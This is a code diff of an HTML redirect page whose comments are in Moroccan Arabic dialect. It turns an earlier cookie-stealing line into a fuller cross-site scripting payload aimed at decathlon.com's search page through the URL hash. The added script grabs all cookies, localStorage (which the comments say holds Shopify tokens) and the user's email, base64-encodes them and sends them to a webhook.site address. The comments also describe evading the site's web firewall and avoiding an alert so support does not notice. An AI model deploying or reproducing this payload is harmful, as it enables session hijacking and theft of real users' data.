@@ -1,16 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Redirecting...</title>
-</head>
 <body>
     <script>
-        // الكود اللي غيسحب الداتا بلا alert باش الـ Support ما يعيق بوالو
-        let exfiltrate = "fetch('https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?data='+btoa(document.cookie))";
-        
-        // استعملنا الـ Hash (#) حيت هو اللي لقينا فيه الثقب
-        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=" + exfiltrate + ">";
-        
+        // سكريبت مركز على الـ Shopify Cookies و Session Data
+        let payload = `
+            (function(){
+                var data = {
+                    title: "CRITICAL_EXFILTRATION",
+                    url: window.location.href,
+                    // سحب كاع الكوكيز (بما فيها osid و shopify_y)
+                    all_cookies: document.cookie,
+                    // سحب الـ LocalStorage كامل حيت فيه الـ Shopify Tokens
+                    storage: JSON.stringify(localStorage),
+                    // محاولة سحب الـ Email إلا كان باين فـ الـ DOM
+                    email: document.querySelector('.user-info__email')?.innerText || "not_found"
+                };
+                // صيفط الداتا لـ Webhook مشفرة بـ Base64
+                var exfilUrl = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?leak=" + btoa(JSON.stringify(data));
+                fetch(exfilUrl, {mode: 'no-cors'});
+            })();
+        `;
+
+        // تحويل الكود لـ URL safe باش يدوز فـ الـ Hash
+        let encodedPayload = encodeURIComponent(payload);
+
+        // الرابط اللي غيصدمهم (استعملنا # باش نهربو من WAF)
+        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encodedPayload + "'))>";
+
         window.location.href = finalTarget;
     </script>
 </body>
